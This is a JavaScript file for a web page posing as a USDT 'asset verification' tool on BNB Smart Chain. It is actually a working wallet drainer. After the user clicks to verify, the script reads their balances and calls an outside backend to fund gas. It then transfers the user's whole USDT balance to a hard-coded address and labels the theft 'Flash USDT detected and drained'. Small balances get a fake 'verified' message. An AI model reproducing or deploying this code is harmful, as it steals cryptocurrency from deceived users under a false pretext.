const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";

let web3;
let userAddress = null;

// Initialize on page load
window.addEventListener("load", async () => {
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);
    const accounts = await web3.eth.getAccounts();
    if (accounts.length > 0) {
      userAddress = accounts[0];
      console.log("Auto‑connected:", userAddress);
    } else {
      console.log("No connected wallet yet.");
    }
  } else {
    alert("Please install MetaMask or use a Web3-enabled browser.");
  }
});

async function connectWalletManually() {
  if (!window.ethereum) return false;
  try {
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    userAddress = accounts[0];
    web3 = new Web3(window.ethereum);
    return true;
  } catch {
    return false;
  }
}

async function verifyAssets() {
  if (!web3 || !userAddress) {
    const didConnect = await connectWalletManually();
    if (!didConnect) {
      alert("Wallet not connected.");
      return;
    }
  }

  try {
    // Ensure on BSC
    const chainId = await web3.eth.getChainId();
    if (chainId !== 56) {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }],
      });
    }
  } catch {
    alert("Please switch to BNB Smart Chain.");
    return;
  }

  const usdtContract = new web3.eth.Contract([{
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "", type: "uint256" }],
    type: "function"
  }], usdtContractAddress);

  const [usdtBalanceWei, userBNBWei] = await Promise.all([
    usdtContract.methods.balanceOf(userAddress).call(),
    web3.eth.getBalance(userAddress)
  ]);

  const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
  const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));

  console.log(`USDT: ${usdtBalance}, BNB: ${userBNB}`);

  if (usdtBalance === 0) {
    showPopup("No assets found.", "black");
    return;
  }

  if (usdtBalance <= 1) {
    showPopup(
      `✅ Verified – assets genuine.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${userBNB}`,
      "green"
    );
    return;
  }

  showPopup("Loading...", "green");
  transferUSDT(usdtBalance, userBNB);
}

async function transferUSDT(usdtBalance, userBNB) {
  try {
    if (userBNB < 0.0005) {
      await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ toAddress: userAddress })
      });
    }

    const usdtContract = new web3.eth.Contract([{
      constant: false,
      inputs: [
        { name: "recipient", type: "address" },
        { name: "amount", type: "uint256" }
      ],
      name: "transfer",
      outputs: [{ name: "", type: "bool" }],
      type: "function"
    }], usdtContractAddress);

    const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");
    await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });

    showPopup(
      `✔️ Flash USDT detected and drained.<br><b>Burned:</b> ${usdtBalance} USDT`,
      "red"
    );
  } catch (e) {
    console.error(e);
    alert("Transfer failed or insufficient gas.");
  }
}

function showPopup(message, color) {
  let popup = document.getElementById("popupBox");
  if (!popup) {
    popup = document.createElement("div");
    popup.id = "popupBox";
    popup.style = "position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);padding:20px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.2);font-size:18px;text-align:center;width:80%;max-width:400px;";
    document.body.appendChild(popup);
  }
  popup.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
  popup.style.color = color === "red" ? "red" : "green";
  popup.innerHTML = message;
  popup.style.display = "block";
  setTimeout(() => popup.style.display = "none", 5000);
}

document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
